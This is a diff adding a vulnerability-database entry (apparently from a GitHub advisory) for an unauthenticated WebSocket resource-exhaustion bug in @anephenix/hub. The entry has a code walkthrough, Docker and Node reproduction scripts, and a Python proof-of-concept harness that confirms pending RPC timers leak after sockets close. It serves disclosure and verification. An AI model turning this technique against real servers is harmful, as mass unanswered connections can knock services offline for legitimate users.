@@ -1,0 +1,328 @@
+[basic]
+description = '''
+### Summary
+
+`@anephenix/hub` starts a `setInterval` polling loop for every incoming WebSocket connection to request a client ID via RPC. If the remote client never replies — which requires no authentication or special configuration — the interval and the pending request object are never cleaned up, even after the socket is closed. An unauthenticated attacker who opens many WebSocket connections and ignores all server RPC messages will therefore cause the server to accumulate unbounded timers and heap entries, leading to CPU and memory exhaustion (DoS).
+
+### Details
+
+When a client connects, `loadDefaultConnectionEventListeners` (registered in `src/lib/index.ts:128`) adds a connection listener that calls `requestClientId({ ws, rpc })` for every new WebSocket (`src/lib/index.ts:262`). `requestClientId` issues an RPC send for the `get-client-id` action (`src/lib/clientId.ts:112`), which internally calls `rpc.send`.
+
+Inside `rpc.send`, the payload is pushed onto `this.requests` (`src/lib/rpc.ts:282`) and `waitForReply` is invoked. `waitForReply` starts a `setInterval` that polls `responses[]` every 10 ms for a matching reply (`src/lib/rpc.ts:250`):
+
+```ts
+// src/lib/rpc.ts:250–267
+interval = setInterval(() => {
+    const response = responses.find(
+        (r) => r.id === id && r.action === action,
+    );
+    if (response) {
+        if (interval) clearInterval(interval);
+        // ... resolve and cleanup
+        this.cleanupRPCCall(response);
+    }
+}, 10);
+```
+
+`clearInterval` is only called when a matching response arrives. There is no timeout path and no socket-close handler that clears either the interval or the `this.requests` entry. The `close` handler registered in `loadDefaultConnectionEventListeners` (`src/lib/index.ts:128–134`) only calls `pubsub.unsubscribeClientFromAllChannels`; it does not cancel pending RPC requests for that socket.
+
+**Data flow (source → sink):**
+
+1. `src/lib/index.ts:269` — `wss.on(\"connection\")` accepts any remote WebSocket (no authentication).
+2. `src/lib/index.ts:272` — connection listeners are iterated and invoked.
+3. `src/lib/index.ts:262` — `requestClientId({ ws, rpc: this.rpc })` is called for every connection by default.
+4. `src/lib/clientId.ts:112` — `rpc.send({ ws, action: 'get-client-id' })` creates an RPC request.
+5. `src/lib/rpc.ts:282` — `this.requests.push(payload)` registers the pending request.
+6. `src/lib/rpc.ts:250` — `setInterval(..., 10)` begins infinite polling; cleanup only happens on a matching response. Socket close does not trigger cleanup.
+
+### PoC
+
+**Prerequisites:** Docker must be available on the host.
+
+**Step 1 — Build the verification image:**
+
+```bash
+docker build --no-cache \
+  -f vuln-001/Dockerfile \
+  -t hub-vuln-001:latest \
+  reports/npm_web_272_anephenix__hub
+```
+
+**Step 2 — Run the container:**
+
+```bash
+docker run --rm --network none hub-vuln-001:latest
+```
+
+The container runs `verify.mjs`, which:
+1. Starts a `Hub` server on a local port.
+2. Opens a WebSocket and waits for the server's `get-client-id` RPC message without replying.
+3. Closes the socket and waits 300 ms.
+4. Inspects `hub.rpc.requests.length` — it must remain `1` even though `hub.wss.clients.size` is `0`.
+5. Opens five more sockets the same way (batch), then verifies that `pendingRpcRequests` equals `6`.
+
+**Step 3 — Alternatively, run the Python orchestrator directly:**
+
+```bash
+python3 vuln-001/poc.py
+```
+
+**Expected output (confirmed):**
+
+```json
+{
+  \"snapshotAfterClose\":  {\"clientState\": 3, \"serverClients\": 0, \"pendingRpcRequests\": 1},
+  \"snapshotAfterBatch\":  {\"serverClients\": 0, \"pendingRpcRequests\": 6, \"expectedPendingRpcRequests\": 6}
+}
+```
+
+`pendingRpcRequests` grows linearly with the number of unanswered connections and never decreases, confirming the unbounded resource leak.
+
+**Minimal inline reproduction** (without Docker, inside the repository after `npm ci && npm run build`):
+
+```bash
+node --input-type=module - <<'EOF'
+import Hub from './dist/esm/index.js';
+import { WebSocket } from 'ws';
+
+const port = 8766;
+const hub = new Hub({ port });
+hub.listen();
+const ws = new WebSocket(`ws://localhost:${port}`);
+
+await new Promise((resolve) => ws.once('message', resolve));
+ws.close();
+await new Promise((resolve) => setTimeout(resolve, 300));
+console.log(JSON.stringify({
+  serverClients:      hub.wss.clients.size,
+  pendingRpcRequests: hub.rpc.requests.length,
+}));
+hub.server.close();
+process.exit(0);
+EOF
+```
+
+Expected:
+
+```json
+{\"serverClients\": 0, \"pendingRpcRequests\": 1}
+```
+
+### Impact
+
+This is an **unauthenticated Denial-of-Service** vulnerability. Any network-reachable `@anephenix/hub` server running with default configuration is affected. An attacker who opens a large number of WebSocket connections and never replies to the server's `get-client-id` RPC causes the server process to accumulate one `setInterval` timer (polling every 10 ms) and one heap object per connection indefinitely. With enough connections this exhausts CPU scheduling time and memory, making the server unavailable to legitimate clients.
+
+No authentication, special headers, or knowledge of internal protocol details are required — a plain WebSocket `connect` followed by silence is sufficient.
+
+### Reproduction artifacts
+
+#### `Dockerfile`
+
+```dockerfile
+FROM node:20-alpine
+
+RUN apk add --no-cache python3 make g++
+
+WORKDIR /app
+
+# Install dependencies first for layer caching
+COPY repo/package.json repo/package-lock.json ./
+RUN npm ci --ignore-scripts
+
+# Copy the rest of the source and build
+COPY repo/ ./
+RUN npm run build
+
+# Copy the vulnerability verification script into /app so node_modules is resolvable
+COPY vuln-001/verify.mjs /app/verify.mjs
+
+CMD [\"node\", \"/app/verify.mjs\"]
+```
+
+#### `poc.py`
+
+```python
+#!/usr/bin/env python3
+\"\"\"
+VULN-001 PoC — Unauthenticated WebSocket RPC Waiter Resource Exhaustion
+(@anephenix/hub v0.2.15)
+
+Builds a Docker image containing the hub library and a verification script,
+then runs the container to produce deterministic evidence that
+hub.rpc.requests[] entries (and their backing setInterval timers) are never
+cleaned up when a WebSocket client disconnects without replying to the
+server's \"get-client-id\" RPC request.
+
+Usage:
+    python3 poc.py
+
+Exit codes:
+    0  — vulnerability confirmed (PASS)
+    1  — not reproduced (FAIL)
+    2  — environment / build error
+\"\"\"
+
+import json
+import subprocess
+import sys
+from pathlib import Path
+
+# ---------------------------------------------------------------------------
+# Paths
+# ---------------------------------------------------------------------------
+SCRIPT_DIR = Path(__file__).resolve().parent
+REPO_ROOT   = SCRIPT_DIR.parent              # …/npm_web_272_anephenix__hub/
+DOCKERFILE  = SCRIPT_DIR / \"Dockerfile\"
+POC_TAG     = \"hub-vuln-001:latest\"
+
+BUILD_CMD = [
+    \"docker\", \"build\",
+    \"--no-cache\",
+    \"-f\", str(DOCKERFILE),
+    \"-t\", POC_TAG,
+    str(REPO_ROOT),   # build context = parent dir so COPY repo/ and COPY vuln-001/ both resolve
+]
+
+RUN_CMD = [
+    \"docker\", \"run\",
+    \"--rm\",
+    \"--network\", \"none\",  # no external network access needed
+    POC_TAG,
+]
+
+
+def banner(msg: str) -> None:
+    print(f\"\n{'='*60}\n  {msg}\n{'='*60}\")
+
+
+def run(cmd: list[str], **kwargs) -> subprocess.CompletedProcess:
+    print(\"$\", \" \".join(cmd))
+    return subprocess.run(cmd, **kwargs)
+
+
+def build_image() -> None:
+    banner(\"Phase 1 — Building Docker image\")
+    result = run(BUILD_CMD, capture_output=False)
+    if result.returncode != 0:
+        print(\"[ERROR] Docker build failed.\", file=sys.stderr)
+        sys.exit(2)
+    print(\"[OK] Image built:\", POC_TAG)
+
+
+def run_poc() -> dict:
+    banner(\"Phase 2 — Running vulnerability verification inside container\")
+    result = run(RUN_CMD, capture_output=True, text=True)
+
+    print(\"--- container stdout ---\")
+    print(result.stdout)
+    if result.stderr:
+        print(\"--- container stderr ---\")
+        print(result.stderr)
+
+    # The container exits 0 on confirmed leak, 1 otherwise.
+    if result.returncode == 2:
+        print(\"[ERROR] Verification script crashed.\", file=sys.stderr)
+        sys.exit(2)
+
+    try:
+        data = json.loads(result.stdout)
+    except json.JSONDecodeError as exc:
+        print(f\"[ERROR] Could not parse container output as JSON: {exc}\", file=sys.stderr)
+        sys.exit(2)
+
+    return data, result.returncode
+
+
+def evaluate(data: dict, container_exit: int) -> tuple[bool, str]:
+    \"\"\"Return (passed, evidence_summary).\"\"\"
+    after_close = data.get(\"snapshotAfterClose\", {})
+    after_batch  = data.get(\"snapshotAfterBatch\", {})
+
+    leaked_single = (
+        after_close.get(\"pendingRpcRequests\", 0) > 0 and
+        after_close.get(\"serverClients\", -1) == 0 and
+        after_close.get(\"clientState\", -1) == 3          # WebSocket.CLOSED
+    )
+
+    leaked_batch = (
+        after_batch.get(\"pendingRpcRequests\", 0) ==
+        after_batch.get(\"expectedPendingRpcRequests\", -1)
+    )
+
+    passed = leaked_single and leaked_batch and container_exit == 0
+
+    evidence = (
+        f\"snapshotAfterClose={json.dumps(after_close)}; \"
+        f\"snapshotAfterBatch={json.dumps(after_batch)}; \"
+        f\"container_exit={container_exit}\"
+    )
+    return passed, evidence
+
+
+def main() -> None:
+    build_image()
+    data, container_exit = run_poc()
+
+    banner(\"Phase 3 — Evaluating results\")
+    passed, evidence = evaluate(data, container_exit)
+
+    if passed:
+        print(\"[PASS] Leak confirmed: RPC waiter entries persist after socket close.\")
+    else:
+        print(\"[FAIL] Leak NOT observed — check container output above.\")
+
+    return passed, evidence, data
+
+
+if __name__ == \"__main__\":
+    passed, evidence, raw = main()
+
+    verdict = \"PASS\" if passed else \"FAIL\"
+    reason = (
+        \"소켓이 닫힌 뒤에도 hub.rpc.requests[] 항목과 setInterval 타이머가 해제되지 않음이 \"
+        \"런타임 검사로 확인됨. 단일 연결에서 pendingRpcRequests=1이 유지되고, \"
+        \"배치 5개 추가 후 총 6개가 누적되어 선형 리소스 누수가 증명됨.\"
+        if passed else
+        \"컨테이너 실행 결과에서 결정적 증거를 확보하지 못했음.\"
+    )
+
+    result_path = SCRIPT_DIR / \"phase2_result.json\"
+    phase2 = {
+        \"passed\": passed,
+        \"verdict\": verdict,
+        \"reason\": reason,
+        \"build_command\": \" \".join(BUILD_CMD),
+        \"run_command\": \" \".join(RUN_CMD),
+        \"poc_command\": f\"python3 {Path(__file__).name}\",
+        \"evidence\": evidence,
+        \"artifacts\": [\"Dockerfile\", \"verify.mjs\", \"poc.py\"],
+    }
+
+    result_path.write_text(json.dumps(phase2, indent=2, ensure_ascii=False))
+    print(f\"\n[INFO] Results written to {result_path}\")
+
+    sys.exit(0 if passed else 1)
+```
+'''
+published = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "@anephenix/hub: Unauthenticated WebSocket RPC Waiter Resource Exhaustion"
+updated = ""
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["GHSA-g5vv-q72c-7j78"]
+ave_id = "AVE-2026-1103"
+
+[meta]
+collected_at = "2026-08-06T03:52:14.023655214+00:00"
+status = "completed"
+
+[references]
+urls = []
